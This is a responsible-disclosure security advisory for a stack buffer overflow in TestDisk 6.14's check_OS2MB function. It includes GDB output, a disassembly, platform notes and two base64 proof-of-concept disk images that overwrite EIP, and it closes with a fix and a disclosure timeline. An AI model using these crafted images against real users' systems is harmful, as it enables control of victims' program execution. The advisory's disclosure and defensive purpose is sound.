@@ -1,0 +1,141 @@
+(    , )     (,
+  .   '.' ) ('.    ',
+   ). , ('.   ( ) (
+  (_,) .'), ) _ _,
+ /  _____/  / _  \    ____  ____   _____
+ \____  \==/ /_\  \ _/ ___\/  _ \ /     \
+ /       \/   |    \\  \__(  <_> )  Y Y  \
+/______  /\___|__  / \___  >____/|__|_|  /
+        \/         \/.-.    \/         \/:wq
+                    (x.0)
+                  '=.|w|.='
+                  _=''"''=.
+
+                presents..
+
+TestDisk 6.14 Check_OS2MB Stack Buffer Overflow
+Affected versions: TestDisk 6.14 - Linux, Windows and Mac OSX
+
+PDF:
+http://www.security-assessment.com/files/documents/advisory/Testdisk%20Check_OS2MB%20Stack%20Buffer%20Overflow%20-%20Release.pdf
+
++-----------+
+|Description|
++-----------+
+This document details a stack based buffer overflow vulnerability within TestDisk 6.14. A buffer overflow is triggered
+within the software when a malicious disk image is attempted to be recovered. This may be leveraged by an
+attacker to crash TestDisk and gain control of program execution. An attacker would have to coerce the victim to run
+TestDisk against their malicious image.
+
++------------+
+|Exploitation|
++------------+
+The check_OS2MB method (fat.c, line 862) is vulnerable to a stack based buffer overflow. This is due to the 512
+byte buffer 'buffer' (defined in fat.c, check_OS2MB method, line 864) being overflowed by a subsequent memcpy
+call in the cache_pread_aux method (hdcache.c, line 109). The third argument to the memcpy call (defining the
+amount of data to be copied) is controlled by the attacker, this is set in a header in the test case (offset 0xC in the
+below testcase, set to 2048, or 0x0800). 
+
+The following GDB output shows the vulnerable memcpy call and the attacker controlled size argument (0x00000800):
+
+Breakpoint 1, 0x0804e5c2 in cache_pread_aux (disk_car=0x80c13b0, buffer=0xbffff0f0, count=2048, offset=0, read_ahead=0) at hdcache.c:109
+109      memcpy(buffer, cache->buffer + offset - cache->cache_offset, count);
+(gdb) x/i $eip
+=> 0x804e5c2 <cache_pread_aux+298>:  call   0x80499f0 <memcpy@plt>
+(gdb) x/3x $esp
+0xbffff010:  0xbffff0f0  0x080c3000  0x00000800
+
+The following base64 data contains the test case which results in EIP control, in this case EIP being set to
+BEE5BEE5. The value EIP is overwritten with is at 0x20c
+
+6zyQbWtkb3dmcwAACASOAAEAAIAQ+AEAAQABAAAAAOs8kG1rZAApj2Ji7SAgICAgICAgICAgRkFU
+ICAgICAgIEZBVDEyICAgDh++W3ysIsB0C/Ay5M0ezRnr/lRoaXMgaXMgbm90IGEgYm9vdGFibGUg
+ZGlzay4gIFBsZWFzZSBpbnNlcnQgYSBib290YWJsZSBmbG9wcHkgYW5kDQpwcmVzcyBhbnkga2V5
+IHRvIHRyeSBhZ2FpbiAuLi5ADQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAA7v//f/8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADW1tbW1tbW1tbW1tbW1tbW
+1tbW1tbW1tbW1tbW1tYAAAAAAAD+4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAA
+AAAAAAAAAAAAAAD/D//pAAAA5gBAAAAAAAAAAB4AAAAAAAAAAAAAAPQAAAAAAOT98v//AAAAAAAA
+AAAAEAD/AAAAAAAAAAAAAAAAAAAAgAAAAAUE/wAAAAAAAAAA7fcAAACAAAAAAAAAAAAABQAAAAAA
+AAAAIwAAAACAAP/zAAAAAAQAAAAAAAAAAAAAAP8AAPj/ABcAAAAAAJaFhYWA/wAAAAAAAAAAVaoA
+AAAAAAAAKY9iYu3lvuW+NAsGCA0K
+
+--[ Linux
+Note that in the provided test case, 4 bytes at 0x210 have been set to a valid address within the TEXT segment of
+the TestDisk ELF file. This is due to GCC 4.7.2 compiling the Check_OS2MB method with the following assembly
+code:
+
+   0x08060a8d <+71>:  call   *%ecx
+   0x08060a8f <+73>:  mov    %eax,%edx
+   0x08060a91 <+75>:  mov    0x8(%ebp),%eax
+   0x08060a94 <+78>:  mov    0x194(%eax),%eax
+   0x08060a9a <+84>:  cmp    %eax,%edx
+   0x08060a9c <+86>:  je     0x8060ac5 <check_OS2MB+127>
+
+The instruction 'mov 0x8(%ebp), %eax' (0x08060a91) moves an attacker controlled portion of memory into the EAX
+register and subsequently tries to read from that address ('mov 0x194(%eax)'). Thus, this has to be set to a
+legitimate address, otherwise TestDisk performs an out-of-bounds memory read before returning from the
+check_OS2MB method.
+
+As long as EDX and EAX do not match, the check_OS2MB method calls screen_buffer_add and log_redirect, then
+jumps to the end of the check_OS2MB method, successfully exploiting stack overflow and gaining EIP control.
+The precompiled version of TestDisk has been compiled with a stack protector. In order to exploit the precompiled
+version, an attacker would have to find a way to bypass GCC’s '-fstack-protector' functionality
+
+--[ Windows
+The provided test case results in EIP being overwritten with 0xBEE5BEE5 in the precompiled version of TestDisk. 
+This was tested on Windows 7 and 8.1.
+
+--[ Mac OSX
+An attacker can also gain EIP control on the Mac OSX version of TestDisk 6.14, however the original test case
+needs to be padded. The value EIP is overwritten with is at 0x21C in the OSX test case. The base64 of the OSX crash 
+test case is below. As in the above examples, EIP is overwritten with 0xBEE5BEE5.
+
+6zyQbWtkb3dmcwAACASOAAEAAIAQ+AEAAQABAAAAAOs8kG1rZAApj2Ji7SAgICAgICAgICAgRkFU
+ICAgICAgIEZBVDEyICAgDh++W3ysIsB0C/Ay5M0ezRnr/lRoaXMgaXMgbm90IGEgYm9vdGFibGUg
+ZGlzay4gIFBsZWFzZSBpbnNlcnQgYSBib290YWJsZSBmbG9wcHkgYW5kDQpwcmVzcyBhbnkga2V5
+IHRvIHRyeSBhZ2FpbiAuLi5ADQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAA7v//f/8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADW1tbW1tbW1tbW1tbW1tbW
+1tbW1tbW1tbW1tbW1tYAAAAAAAD+4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAA
+AAAAAAAAAAAAAAD/D//pAAAA5gBAAAAAAAAAAB4AAAAAAAAAAAAAAPQAAAAAAOT98v//AAAAAAAA
+AAAAEAD/AAAAAAAAAAAAAAAAAAAAgAAAAAUE/wAAAAAAAAAA7fcAAACAAAAAAAAAAAAABQAAAAAA
+AAAAIwAAAACAAP/zAAAAAAQAAAAAAAAAAAAAAP8AAPj/ABcAAAAAAJaFhYWA/wAAAAAAAAAAVaoA
+AAAAAAAAKY9iYu0AAAAAAAAAAAAAAAAAAAAA5b7lvg==
+
++----------+
+| Solution |
++----------+
+Upgrade to TestDisk 7.0 or newer.
+
++-------------------+
+|Disclosure Timeline|
++-------------------+
+9/04/2015 – Advisory sent to Christophe Grenier.
+9/04/2015 – Response from Christophe Grenier advising that a fix is ready for the 
+development version. Christophe advised a new stable version will be available in 2 weeks.
+18/04/2015 – TestDisk 7.0 Released.
+30/04/2015 – Release of this document.
+
++-----------------------------+
+|About Security-Assessment.com|
++-----------------------------+
+
+Security-Assessment.com is Australasia's leading team of Information 
+Security consultants specialising in providing high quality Information 
+Security services to clients throughout the Asia Pacific region. Our 
+clients include some of the largest globally recognised companies in 
+areas such as finance, telecommunications, broadcasting, legal and 
+government. Our aim is to provide the very best independent advice and 
+a high level of technical expertise while creating long and lasting 
+professional relationships with our clients. Security-Assessment.com 
+is committed to security research and development, and its team continues
+to identify and responsibly publish vulnerabilities in public and 
+private software vendor's products. Members of the 
+Security-Assessment.com R&D team are globally recognised through their 
+release of whitepapers and presentations related to new security research. 
+
+For further information on this issue or any of our service offerings, 
+contact us: 
+
+Web www.security-assessment.com 
+Email info () security-assessment com 
+Phone +64 4 470 1650 
